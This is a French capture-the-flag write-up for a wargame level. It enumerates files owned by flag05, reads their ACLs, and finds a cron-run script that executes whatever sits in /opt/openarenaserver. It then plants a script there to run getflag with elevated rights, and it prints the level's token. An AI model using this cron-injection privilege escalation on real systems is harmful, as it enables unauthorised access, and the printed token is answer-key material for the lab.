# Level 05

```bash
$ ls -la
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc
-r-x------  1 level05 level05  675 Apr  3  2012 .profile

$ find / -user level05 2> /dev/null
(rien dinteressant)

$ find / -user flag05 2> /dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

Okay donc on a 2 fichiers
On check les droits

```bash
$ ls -l /usr/sbin/openarenaserver; ls -l /rofs/usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
-rwxr-x--- 1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver
```

Un + qui nous dit qu'il y'a des droits ACL dans le fichier on check les permissions :

```bash
$ getfacl /usr/sbin/openarenaserver
# file: usr/sbin/openarenaserver
# owner: flag05
# group: flag05
user::rwx
user:level05:r--
group::r-x
mask::r-x
other::---
```

On voit que level05 a une permission de read le fichier, on le read

```bash
$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

C'est un script qui execute tous les scripts dans le dossier /opt/openarenaserver/ puis les delete
Le user level05 n'a pas les droits d'executions donc on test pour voir si un crontab execute ce script

```bash
$ echo "test" > /opt/openarenaserver/test.sh
```

Le fichier disparrait bien apres un certain temps.
On utilise ce cron comme il est execute par flag05 donc les fichiers dans /opt/openarenaserver/ sont executes avec les droits de flag05

```bash
$ echo "getflag > /tmp/flaglevel5" > /opt/openarenaserver/test.sh

$ cat /tmp/flaglevel5
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

